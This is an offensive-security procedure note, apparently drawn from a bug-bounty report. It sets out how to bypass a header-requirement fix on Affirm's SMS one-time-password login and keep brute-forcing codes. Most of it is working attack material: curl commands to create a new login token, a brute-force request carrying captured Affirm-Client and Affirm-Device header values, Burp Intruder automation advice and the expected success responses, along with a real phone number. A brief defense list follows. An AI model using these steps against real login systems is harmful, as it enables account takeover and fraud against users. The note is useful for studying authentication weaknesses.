---
tags:
  - bypass
  - headers
  - brute-force
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/initiate-sms-login-token-bypass]]'
  - '[[commands/submit-otp-with-headers]]'
verified: false
platforms:
  - Mobile
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:30:47.315Z'
sub_techniques: []
id: 1ac57671-1f26-496a-a6a6-58d06c455662
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Account Manipulation]]'
---
# Bypass-Fix-with-Required-Headers-for-Brute-Force

## Summary

This procedure circumvents an initial fix that enforces headers by including Affirm-Client and Affirm-Device in requests, allowing continued OTP brute-force on new tokens.

## Description

After a partial fix requiring headers for OTP submission, generate a new token and include fabricated or captured Affirm-Client/Device headers to avoid 401 errors. Rate limiting remains absent at the token level, enabling brute-force. Prerequisites: Header values from app traffic. Outcome: Successful auth despite fix.

## Requirements

1. Captured or generated Affirm-Client and Affirm-Device headers
2. New target phone number if needed
3. Burp for automation

## Defense

Defensive measures and detection strategies:

- Enforce rate limiting per token, not just headers
- Validate header integrity (e.g., device ID binding)
- Block suspicious header patterns or rapid token generation

## Objectives

1. Evade header-based fix
2. Continue OTP brute-force
3. Maintain attack viability

## Instructions

### Step 1: Generate New Token

**Context**: Use a different phone to get fresh token post-fix.

**Command** ([[commands/initiate-sms-login-token-bypass]]):
```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "User-Agent: okhttp/3.13.1" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -d '{"channel":"sms","address":"7022170092"}'
```

> Expected: HTTP 200 with new response_url/{long_token}.

### Step 2: Brute-Force with Headers

**Context**: Submit OTP variations with required headers.

**Command** ([[commands/submit-otp-with-headers]]):
```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/{long_token} \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "Affirm-Device: eyJkZXZpY2VfaWQiOiAiZjM1MWU1NDEtNjVjZS00ZTVhLWI3NDMtYWYxZTcwMzRkNGNhIn0=" \
  -H "Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJS8gs0CY0yDAuMcjcON7d0D1HSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGUKGrU.EP8W9Q.zxALHtprHXz2S5Ik9O6gf2DmGos" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22" \
  -d '{"response":"0000"}'
```

> Vary response in Intruder. Expected on success: HTTP 200 auth; invalid: 400 length 629. ~135 attempts feasible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force
- [[Account Manipulation]] Account Manipulation

### Sub-Techniques


## Commands Used

- [[commands/initiate-sms-login-token-bypass]]
- [[commands/submit-otp-with-headers]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- bypass
- headers
